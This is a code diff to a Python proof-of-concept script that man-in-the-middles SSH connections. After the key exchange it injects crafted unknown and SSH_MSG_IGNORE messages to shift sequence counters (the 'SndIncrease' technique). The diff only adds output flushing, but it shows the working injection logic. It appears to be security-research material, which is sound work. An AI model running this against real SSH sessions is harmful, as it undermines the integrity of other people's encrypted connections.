@@ -28,8 +28,8 @@ from common import contains_newkeys, run_tcp_mitm
 @click.option("--server-port", default=22, help="The port where the SSH server is running.")
 @click.option("-N", "--increase-by", default=1, help="The number by which C.Snd will be increased.")
 def cli(proxy_ip, proxy_port, server_ip, server_port, increase_by):
-    print("--- Proof of Concept for SndIncrease technique ---")
-    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.")
+    print("--- Proof of Concept for SndIncrease technique ---", flush=True)
+    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.", flush=True)
     run_tcp_mitm(proxy_ip, proxy_port, server_ip, server_port, forward_server_to_client=lambda in_socket, out_socket: inject_sndincrease(in_socket, out_socket, increase_by), forward_client_to_server=pipe_discard_during_technique)
 
 rogue_unknown_msg = unhexlify('0000000C060900000000000000000000')
@@ -41,15 +41,15 @@ def inject_sndincrease(in_socket, out_socket, increase_by):
         while True:
             data = in_socket.recv(4096)
             if contains_newkeys(data):
-                print("[+] SSH_MSG_NEWKEYS sent by server identified!")
+                print("[+] SSH_MSG_NEWKEYS sent by server identified!", flush=True)
                 technique_in_progress = True
-                print(f"[+] Injecting {increase_by} unknown messages to increase C.Snd by {increase_by}!")
+                print(f"[+] Injecting {increase_by} unknown messages to increase C.Snd by {increase_by}!", flush=True)
                 for _ in trange(increase_by):
                     out_socket.send(rogue_unknown_msg)
-                print(f"[+] Injecting 2**32 - {increase_by} SSH_MSG_IGNORE to fix C.Rcv!")
+                print(f"[+] Injecting 2**32 - {increase_by} SSH_MSG_IGNORE to fix C.Rcv!", flush=True)
                 for _ in trange(2**32 - increase_by):
                     out_socket.send(rogue_msg_ignore)
-                print("[+] Injection done, waiting 3 seconds before continuing to forward traffic.")
+                print("[+] Injection done, waiting 3 seconds before continuing to forward traffic.", flush=True)
                 # Rough workaround to avoid forwarding any unimplemented messages to the server
                 sleep(3)
                 technique_in_progress = False
@@ -57,9 +57,9 @@ def inject_sndincrease(in_socket, out_socket, increase_by):
                 break
             out_socket.send(data)
     except ConnectionResetError:
-        print("[!] Socket connection has been reset. Closing sockets.")
+        print("[!] Socket connection has been reset. Closing sockets.", flush=True)
     except OSError:
-        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
+        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.", flush=True)
     in_socket.close()
     out_socket.close()
 
@@ -74,9 +74,9 @@ def pipe_discard_during_technique(in_socket, out_socket):
             if not technique_in_progress:
                 out_socket.send(data)
     except ConnectionResetError:
-        print("[!] Socket connection has been reset. Closing sockets.")
+        print("[!] Socket connection has been reset. Closing sockets.", flush=True)
     except OSError:
-        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
+        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.", flush=True)
     in_socket.close()
     out_socket.close()
 
